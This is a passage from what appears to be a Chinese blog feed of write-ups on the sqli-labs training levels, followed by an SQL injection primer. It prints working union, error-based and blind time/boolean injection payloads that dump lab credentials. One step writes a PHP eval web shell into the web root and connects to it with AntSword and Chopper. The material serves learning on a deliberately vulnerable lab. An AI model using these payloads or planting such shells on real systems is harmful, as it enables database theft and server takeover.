alt="7"></h4><p>查询源代码可知该关卡登录成功只返回图片不返回结果；因此可采用布尔盲注或时间盲注。</p><h4 id="2-爆库名-1"><a href="#2-爆库名-1" class="headerlink" title="2.爆库名"></a>2.爆库名<img src="/2020/11/22/sqli-labs%E4%B8%89/8.jpg" alt="8"></h4><h4 id="3-爆表-1"><a href="#3-爆表-1" class="headerlink" title="3.爆表"></a>3.爆表<img src="/2020/11/22/sqli-labs%E4%B8%89/9.jpg" alt="9"></h4><p>接下去与less-6提到的报错步骤相似，不再赘述。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/10.jpg" alt="10"></h4><p>其余与上述关卡类似。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p>本关可以使用布尔盲注或时间注入。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/11.jpg" alt="11"></p><p><strong>注意</strong>:&amp;passwd=1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/15.jpg" alt="15"></p><h4 id="2-爆库名-2"><a href="#2-爆库名-2" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>库名：</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/16.jpg" alt="16"></p><p>之后语句皆与less-8一样。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16<img src="/2020/11/22/sqli-labs%E4%B8%89/12.jpg" alt="12"></h2><p>其余与15关类似。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>先看源代码</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/18.jpg" alt="18"></p><p>uname用check_input()函数进行了处理，只截取15个字符；</p><p>get_magic_quotes_gpc()用于判断解析用户提示的数据，特别是post、get、cookie过来的数据增加转义字符“\”。</p><p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p><p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p><p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p><p>intval()   整型转换一系列过滤过于麻烦，故从password注入。</p><h4 id="1-试探-4"><a href="#1-试探-4" class="headerlink" title="1.试探"></a>1.试探</h4><p><img src="/2020/11/22/sqli-labs%E4%B8%89/19.jpg" alt="19"></p><p>确定为单引号注入。</p><h4 id="2-爆库名-3"><a href="#2-爆库名-3" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>之前报错试过updatexml，这关试看看floor()和extractvalue()。</p><p>floor()：比较麻烦</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/20.jpg" alt="20"></p><p>extractvalue()：与updatexml相似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/22.jpg" alt="22"></p><p>其余步骤不再赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（二）</title>
    <link href="/2020/11/09/sqli-labs/"/>
    <url>/2020/11/09/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs–2"><a href="#Sqli-labs–2" class="headerlink" title="Sqli-labs–2"></a>Sqli-labs–2</h1><ul><li><a href="#sqli-labs--2">Sqli-labs–2</a><ul><li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a><ul><li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2">1.试探:</a></li><li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>猜数据库名长度</strong>:</a></li><li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>猜库名：</strong></a></li><li><a href="#4%E7%88%86%E8%A1%A8"><strong>4.爆表：</strong></a></li><li><a href="#5%E7%88%86%E5%88%97"><strong>5.爆列：</strong></a></li><li><a href="#6%E7%88%86%E5%80%BC"><strong>6.爆值：</strong></a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a><ul><li><a href="#less-6">Less-6</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-1">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.爆库名</a></li><li><a href="#3%E7%88%86%E8%A1%A8">3.爆表</a></li><li><a href="#4%E7%88%86%E5%88%97">4.爆列</a></li><li><a href="#5%E7%88%86%E5%80%BC">5.爆值</a></li></ul></li><li><a href="#less-7">Less-7</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-2">1.试探</a></li><li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a></li><li><a href="#%E6%B3%95%E4%BA%8C">法二：</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">法三：时间盲注</a></li><li><a href="#less-8">Less-8</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-3">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.爆库长</a></li><li><a href="#3%E7%88%86%E5%BA%93">3.爆库</a></li><li><a href="#4%E7%88%86%E8%A1%A8-1">4.爆表</a></li><li><a href="#5%E7%88%86%E5%88%97-1">5.爆列</a></li><li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a><ul><li><a href="#less-9">Less-9</a></li><li><a href="#less-10">Less-10</a></li></ul></li></ul></li></ul></li></ul><h2 id="法一-联合注入"><a href="#法一-联合注入" class="headerlink" title="法一:联合注入"></a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a href="#盲注猜解Less-5" class="headerlink" title="盲注猜解Less-5"></a>盲注猜解Less-5</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探:"></a>1.试探:</h4><p>插入<code>?id=1&#39;</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p><h4 id="2-猜数据库名长度"><a href="#2-猜数据库名长度" class="headerlink" title="2.猜数据库名长度:"></a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p><p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p><h4 id="3-猜库名："><a href="#3-猜库名：" class="headerlink" title="3.猜库名："></a>3.<strong>猜库名：</strong></h4><p><code>&#39; and left((select database()),1)=&#39;s&#39;--+</code>回显正常，再探寻第二个字母<code>&#39; and left((select database()),2)=&#39;sy&#39;--+</code>报错：</p><p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p><p>将y换成e后正常，依次推出八位数（经漫长的试探…….）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p><h4 id="4-爆表："><a href="#4-爆表：" class="headerlink" title="4.爆表："></a><strong>4.爆表：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p><img src="/2020/11/09/sqli-labs/4.jpg" alt="4"></p><h4 id="5-爆列："><a href="#5-爆列：" class="headerlink" title="5.爆列："></a><strong>5.爆列：</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" alt="5"></p><h4 id="6-爆值："><a href="#6-爆值：" class="headerlink" title="6.爆值："></a><strong>6.爆值：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" alt="6"></p><h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p><h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p><p><img src="/2020/11/09/sqli-labs/10.jpg" alt="10"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/11.jpg" alt="11"></p><h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/12.jpg" alt="12"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p><p><img src="/2020/11/09/sqli-labs/13.jpg" alt="13"></p><p><img src="/2020/11/09/sqli-labs/18.jpg" alt="18"></p><p>……还有很多，不一一列举。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探</h4><p>输入<code>id=1&#39;</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" alt="8"></p><h4 id="2-获取文件路径"><a href="#2-获取文件路径" class="headerlink" title="2.获取文件路径"></a>2.获取文件路径</h4><p>科普小知识：</p><p>@@datadir 读取数据库路径;@@basedir MYSQL 获取安装路径</p><p>一句话木马:本关用到php版本的一句话木马：<code>&lt;?php @eval($_POST[“cmd”]);?&gt; </code></p><p>load_file(): 读取本地文件; into outfile :写文件;</p><p>用命令<code>union select 1,@@basedir,@@datadir --+</code>在低关卡查询文件的相对路径<img src="/2020/11/09/sqli-labs/9.jpg" alt="9"></p><h6 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h6><p>根据以上查询的文件地址使用<code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p><p>蚁剑:</p><p><img src="/2020/11/09/sqli-labs/26.jpg" alt="26"></p><p>注：密码为木马语句post框里的内容。</p><p>打开：</p><p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p><p>也可以用菜刀：</p><p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p><p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php……为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天……</p><h6 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h6><p>使用<code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p><p>可以在目录下发现text.php文件</p><p><img src="/2020/11/09/sqli-labs/19.jpg" alt="19"></p><p>爆数据库名</p><p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p><p>爆表</p><p><code>union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile</code></p><p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p><p>爆字段</p><p><code>union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p><p>爆值</p><p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" alt="24"></p><h2 id="法三：时间盲注"><a href="#法三：时间盲注" class="headerlink" title="法三：时间盲注"></a>法三：时间盲注</h2><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p><code>id=1&#39;</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来……）</p><h4 id="2-爆库长"><a href="#2-爆库长" class="headerlink" title="2.爆库长"></a>2.爆库长</h4><p><code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" alt="25"></p><p>图中圈圈在值为8的时候延迟了，故值为8</p><h4 id="3-爆库"><a href="#3-爆库" class="headerlink" title="3.爆库"></a>3.爆库</h4><p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p><p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=’security’。</p><h4 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h4><p><code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; ,sleep(5),1)--+</code></p><p>得出表名为users。</p><h4 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h4><p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 5,1),8)=&#39;password&#39; ,sleep(5),1) --+</code></p><p>在limit5,1的时候查到了password，在limit4,1时查到了username.</p><h4 id="6-爆值"><a href="#6-爆值" class="headerlink" title="6.爆值"></a>6.爆值</h4><p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p><p><code>?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p><p>所以第一个用户的名字dumb，密码dumb；在经过漫长的尝试依次查出其余的值。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>输入一系列符号，发现一直you are in ……;判断为时间盲注。输入<code>?id=1&#39; and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（一）</title>
    <link href="/2020/11/08/sqli/"/>
    <url>/2020/11/08/sqli/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><ol><li><code>?id=1 and 1=2 --+</code>若返回结果正常，说明不是数字类型；</li><li><code>?id=1&#39; --+</code> 显示不正常,<code>?id=1&#39;) --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li></ol><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h4 id="法一：UNION联合查询注入"><a href="#法一：UNION联合查询注入" class="headerlink" title="法一：UNION联合查询注入"></a>法一：UNION联合查询注入</h4><ol><li>用and 1=2测试 ，页面回显正常，所以该地方不是数值查询。</li><li>尝试在id后面加上’，页面回显不正常，可能存在SQL字符注入。</li><li>用–+将sql后面的语句注视掉后，页面回显正常，则证明这个地方是单引号字符型注入</li><li>使用order by 语句判断有几列数据；order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。</li><li>将id=1改为一个数据库不存在的id值，如-1（当用id=1的时候执行的结果只有一条记录，因为在 index.php 中并没有循环取出数据，<strong>故让第一行查询的结果是空集，union右边的查询结果自然就成为了第一行</strong>，打印在网页上了，id一般是数字，从1开始自增的，可把id值设为非正数（负数或0），浮点数，字符型或字符串）使用union select 1,2,3联合查询语句查看页面是否有显示位。<img src="/2020/11/08/sqli/11.jpg" alt="11"></li></ol><p>输出结果说明页面有2个显示位。</p><p>6.用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。</p><p><strong>查询数据库名:</strong></p><p> <code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" alt="12"></p><p><strong>查询所有表名:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code><img src="/2020/11/08/sqli/13.jpg" alt="13"></p><p><strong>查列名：</strong></p><p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><img src="/2020/11/08/sqli/14.jpg" alt="14"></p><p><strong>查询用户名，密码:</strong></p><p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p><p><img src="/2020/11/08/sqli/15.jpg" alt="15"></p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h4 id="法二：报错型注入"><a href="#法二：报错型注入" class="headerlink" title="法二：报错型注入"></a>法二：报错型注入</h4><p>因less1-4的步骤类似，故报错型注入以less3为例。</p><p>输入单引号报错，输入 –+后仍报错，故不是简单的单引号报错；输入<code>?id=1&#39;) --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p><p><strong>爆表</strong></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p><p><img src="/2020/11/08/sqli/16.jpg" alt="16"></p><p><strong>爆列</strong></p><p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img src="/2020/11/08/sqli/17.jpg" alt="17"></p><p><strong>爆值</strong><br> <code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p><p><img src="/2020/11/08/sqli/18.jpg" alt="18"></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p><p><img src="/2020/11/08/sqli/19.jpg" alt="19"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入单引号不报错，<code>?id=1&#39;)</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL基础</title>
    <link href="/2020/11/08/SQL/"/>
    <url>/2020/11/08/SQL/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><ul><li><a href="#sql">SQL</a><ul><li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">变量类型</a></li><li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTP提交方式</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">注入方式</a></li><li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">编码问题</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a><ul><li><a href="#information_schema"><strong>information_schema</strong></a></li><li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(所有数据库的基本信息)</a></li><li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(存储表信息)</a></li><li><a href="#columns%E5%82%A8%E5%AD%98%E5%88%97%E4%BF%A1%E6%81%AF"><strong>COLUMNS</strong>(储存列信息)</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">获取字段数</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取系统数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取当前数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">获取数据库中的表</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5">获取表中的字段</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">获取各个字段的值</a></li></ul></li><li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a><ul><li><a href="#union%E6%B3%A8%E5%85%A5">union注入</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a><ul><li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexp正则注入</a></li><li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">like匹配注入</a></li></ul></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a><ul><li><a href="#floor%E5%92%8Crand">floor()和rand()</a></li><li><a href="#extractvalue">extractvalue()</a></li><li><a href="#updatexml">updatexml()</a></li><li><a href="#geometrycollection">geometrycollection()</a></li><li><a href="#multipoint">multipoint()</a></li><li><a href="#polygon">polygon()</a></li><li><a href="#multipolygon">multipolygon()</a></li><li><a href="#linestring">linestring()</a></li><li><a href="#multilinestring">multilinestring()</a></li><li><a href="#exp">exp()</a></li></ul></li><li><a href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5">时间注入</a></li><li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">堆叠查询注入</a></li><li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</a></li><li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></li></ul></li></ul></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><ul><li>数字型</li><li>字符型</li></ul><h4 id="HTTP提交方式"><a href="#HTTP提交方式" class="headerlink" title="HTTP提交方式"></a>HTTP提交方式</h4><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union注入</li></ul><h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul><li>宽字节注入</li></ul><h2 id="信息数据库（MySql-5-0以上）"><a href="#信息数据库（MySql-5-0以上）" class="headerlink" title="信息数据库（MySql 5.0以上）"></a>信息数据库（MySql 5.0以上）</h2><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p><h4 id="SCHEMATA-所有数据库的基本信息"><a href="#SCHEMATA-所有数据库的基本信息" class="headerlink" title="SCHEMATA(所有数据库的基本信息)"></a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：union select 1,2,group_concat(schema_name) from information_schema.schemata </span><br></pre></td></tr></table></figure><h4 id="TABLES-存储表信息"><a href="#TABLES-存储表信息" class="headerlink" title="TABLES(存储表信息)"></a><strong>TABLES</strong>(存储表信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表： union select 1,2,group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure><h4 id="COLUMNS-储存列信息"><a href="#COLUMNS-储存列信息" class="headerlink" title="COLUMNS(储存列信息)"></a><strong>COLUMNS</strong>(储存列信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure><h4 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h4><p>  concat(str1,str2,…)——没有分隔符地连接字符串</p><p>  concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>  group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p><h2 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h2><h4 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure><h4 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,database()</span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure><p>但法二需一一查询表名。</p><h4 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_shema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;</span><br></pre></td></tr></table></figure><h4 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h4><figure class="highlight plain"><table><tr><td 